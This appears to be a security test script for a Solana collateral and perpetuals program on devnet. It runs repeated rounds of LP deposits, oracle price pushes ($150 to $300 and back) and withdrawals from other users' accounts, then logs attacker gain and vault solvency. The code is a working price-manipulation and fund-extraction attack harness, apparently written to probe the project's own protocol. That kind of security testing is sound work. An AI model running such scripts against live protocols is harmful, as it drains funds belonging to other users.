/**
 * Multi-Round Attack Test
 *
 * Test if repeated cycles of deposit/withdraw can extract extra value:
 * 1. Deposit to LP
 * 2. Manipulate price
 * 3. Withdraw from user account
 * 4. Repeat and track cumulative extraction
 */

import { Connection, Keypair, PublicKey, Transaction, ComputeBudgetProgram, sendAndConfirmTransaction, SYSVAR_CLOCK_PUBKEY } from "@solana/web3.js";
import { getOrCreateAssociatedTokenAccount, getAssociatedTokenAddressSync, TOKEN_PROGRAM_ID, NATIVE_MINT } from "@solana/spl-token";
import { fetchSlab, parseEngine, parseUsedIndices, parseAccount, AccountKind } from "../src/solana/slab.js";
import { encodeDepositCollateral, encodeKeeperCrank, encodePushOraclePrice, encodeWithdrawCollateral } from "../src/abi/instructions.js";
import { buildAccountMetas, ACCOUNTS_DEPOSIT_COLLATERAL, ACCOUNTS_KEEPER_CRANK, ACCOUNTS_PUSH_ORACLE_PRICE, ACCOUNTS_WITHDRAW_COLLATERAL } from "../src/abi/accounts.js";
import { buildIx } from "../src/runtime/tx.js";
import fs from "fs";

const marketInfo = JSON.parse(fs.readFileSync("devnet-market.json", "utf-8"));
const PROGRAM_ID = new PublicKey(marketInfo.programId);
const SLAB = new PublicKey(marketInfo.slab);
const ORACLE = new PublicKey(marketInfo.oracle);
const VAULT = new PublicKey(marketInfo.vault);
const MINT = new PublicKey(marketInfo.mint);
const LP_IDX = 0;

const conn = new Connection("https://api.devnet.solana.com", "confirmed");
const payer = Keypair.fromSecretKey(
  new Uint8Array(JSON.parse(fs.readFileSync(process.env.HOME + "/.config/solana/id.json", "utf-8")))
);

const DELAY_MS = 1500;

async function delay(ms: number = DELAY_MS) {
  await new Promise(r => setTimeout(r, ms));
}

function log(msg: string) {
  console.log(`[${new Date().toISOString()}] ${msg}`);
}

async function getVaultBalance(): Promise<number> {
  const vaultInfo = await conn.getAccountInfo(VAULT);
  return vaultInfo ? vaultInfo.lamports / 1e9 : 0;
}

async function pushPrice(priceUsd: number): Promise<boolean> {
  await delay();
  const priceE6 = BigInt(Math.round(priceUsd * 1_000_000));
  const timestamp = BigInt(Math.floor(Date.now() / 1000));
  const data = encodePushOraclePrice({ priceE6, timestamp });
  const keys = buildAccountMetas(ACCOUNTS_PUSH_ORACLE_PRICE, [payer.publicKey, SLAB]);
  const tx = new Transaction().add(
    ComputeBudgetProgram.setComputeUnitLimit({ units: 50_000 }),
    buildIx({ programId: PROGRAM_ID, keys, data })
  );
  try {
    await sendAndConfirmTransaction(conn, tx, [payer], { commitment: "confirmed" });
    return true;
  } catch { return false; }
}

async function crank(): Promise<boolean> {
  await delay(1000);
  const crankData = encodeKeeperCrank({ callerIdx: 65535, allowPanic: false });
  const crankKeys = buildAccountMetas(ACCOUNTS_KEEPER_CRANK, [
    payer.publicKey, SLAB, SYSVAR_CLOCK_PUBKEY, ORACLE,
  ]);
  const tx = new Transaction().add(
    ComputeBudgetProgram.setComputeUnitLimit({ units: 300000 }),
    buildIx({ programId: PROGRAM_ID, keys: crankKeys, data: crankData })
  );
  try {
    await sendAndConfirmTransaction(conn, tx, [payer], { commitment: "confirmed" });
    return true;
  } catch { return false; }
}

async function depositToLP(amountLamports: bigint): Promise<boolean> {
  await delay();
  const userAta = await getOrCreateAssociatedTokenAccount(conn, payer, NATIVE_MINT, payer.publicKey);
  const depositData = encodeDepositCollateral({ userIdx: LP_IDX, amount: amountLamports.toString() });
  const depositKeys = buildAccountMetas(ACCOUNTS_DEPOSIT_COLLATERAL, [
    payer.publicKey,
    SLAB,
    userAta.address,
    VAULT,
    TOKEN_PROGRAM_ID,
    SYSVAR_CLOCK_PUBKEY,
  ]);
  const tx = new Transaction().add(
    ComputeBudgetProgram.setComputeUnitLimit({ units: 200_000 }),
    buildIx({ programId: PROGRAM_ID, keys: depositKeys, data: depositData })
  );
  try {
    await sendAndConfirmTransaction(conn, tx, [payer], { commitment: "confirmed" });
    return true;
  } catch { return false; }
}

async function withdraw(userIdx: number, amount: bigint): Promise<boolean> {
  await delay();
  const userAta = getAssociatedTokenAddressSync(MINT, payer.publicKey);
  const vaultPda = new PublicKey(marketInfo.vaultPda);
  const withdrawData = encodeWithdrawCollateral({ idx: userIdx, amount });
  const withdrawKeys = buildAccountMetas(ACCOUNTS_WITHDRAW_COLLATERAL, [
    payer.publicKey, SLAB, VAULT, userAta, vaultPda, TOKEN_PROGRAM_ID, SYSVAR_CLOCK_PUBKEY, ORACLE,
  ]);
  const tx = new Transaction().add(
    ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
    buildIx({ programId: PROGRAM_ID, keys: withdrawKeys, data: withdrawData })
  );
  try {
    await sendAndConfirmTransaction(conn, tx, [payer], { commitment: "confirmed" });
    return true;
  } catch { return false; }
}

async function main() {
  log("=== MULTI-ROUND ATTACK TEST ===\n");

  const initialVault = await getVaultBalance();
  log(`Initial Vault: ${initialVault.toFixed(6)} SOL`);

  let totalDeposited = 0;
  let totalWithdrawn = 0;

  const ROUNDS = 5;
  const DEPOSIT_AMOUNT = 100_000_000n; // 0.1 SOL per round

  for (let round = 1; round <= ROUNDS; round++) {
    log(`\n=== ROUND ${round}/${ROUNDS} ===`);

    const vaultBefore = await getVaultBalance();

    // Step 1: Deposit to LP
    log(`Depositing 0.1 SOL to LP...`);
    const deposited = await depositToLP(DEPOSIT_AMOUNT);
    if (deposited) {
      totalDeposited += 0.1;
      log(`  SUCCESS - Total deposited: ${totalDeposited.toFixed(2)} SOL`);
    } else {
      log(`  FAILED`);
      continue;
    }

    await crank();

    // Step 2: Manipulate price
    log(`Manipulating price ($150 -> $300 -> $150)...`);
    await pushPrice(300);
    await crank();
    await pushPrice(150);
    await crank();

    // Step 3: Try to withdraw from User 1 and User 2
    log(`Attempting withdrawals...`);

    // Try User 1
    const w1 = await withdraw(1, 50_000_000n); // 0.05 SOL
    if (w1) {
      totalWithdrawn += 0.05;
      log(`  User 1: +0.05 SOL`);
    }

    // Try User 2
    const w2 = await withdraw(2, 50_000_000n); // 0.05 SOL
    if (w2) {
      totalWithdrawn += 0.05;
      log(`  User 2: +0.05 SOL`);
    }

    const vaultAfter = await getVaultBalance();
    log(`Round ${round} vault: ${vaultBefore.toFixed(6)} -> ${vaultAfter.toFixed(6)}`);
    log(`Cumulative: deposited=${totalDeposited.toFixed(2)}, withdrawn=${totalWithdrawn.toFixed(2)}`);
    log(`Net gain so far: ${(totalWithdrawn - totalDeposited).toFixed(4)} SOL`);
  }

  // Final analysis
  log("\n=== FINAL ANALYSIS ===");

  const finalVault = await getVaultBalance();

  log(`Initial Vault: ${initialVault.toFixed(6)} SOL`);
  log(`Final Vault: ${finalVault.toFixed(6)} SOL`);
  log(`Vault Change: ${(finalVault - initialVault).toFixed(6)} SOL`);
  log("");
  log(`Total Deposited: ${totalDeposited.toFixed(2)} SOL`);
  log(`Total Withdrawn: ${totalWithdrawn.toFixed(2)} SOL`);
  log(`Net Attacker Gain: ${(totalWithdrawn - totalDeposited).toFixed(4)} SOL`);

  if (totalWithdrawn > totalDeposited + 0.01) {
    log("\n*** VULNERABILITY: Attacker extracted more than deposited! ***");
    log(`Excess extraction: ${(totalWithdrawn - totalDeposited).toFixed(4)} SOL`);
  } else if (totalWithdrawn < totalDeposited - 0.01) {
    log("\n*** ATTACKER LOST MONEY - Security working ***");
    log(`Net loss: ${(totalDeposited - totalWithdrawn).toFixed(4)} SOL`);
  } else {
    log("\n*** BREAK-EVEN - No exploitation ***");
  }

  // Check solvency
  const data = await fetchSlab(conn, SLAB);
  const engine = parseEngine(data);
  let totalLiabilities = engine.insuranceFund.balance;
  const indices = parseUsedIndices(data);
  for (const idx of indices) {
    const acc = parseAccount(data, idx);
    if (acc) {
      totalLiabilities += acc.capital;
      let pnl = acc.pnl;
      if (Number(pnl) > 9e18) pnl = pnl - 18446744073709551616n;
      totalLiabilities += pnl;
    }
  }
  const liabilitiesNum = Number(totalLiabilities) / 1e9;
  log("\n=== SOLVENCY CHECK ===");
  log(`Liabilities: ${liabilitiesNum.toFixed(6)} SOL`);
  log(`Vault: ${finalVault.toFixed(6)} SOL`);
  log(`Status: ${finalVault >= liabilitiesNum ? "SOLVENT" : "*** INSOLVENT ***"}`);
}

main().catch(console.error);
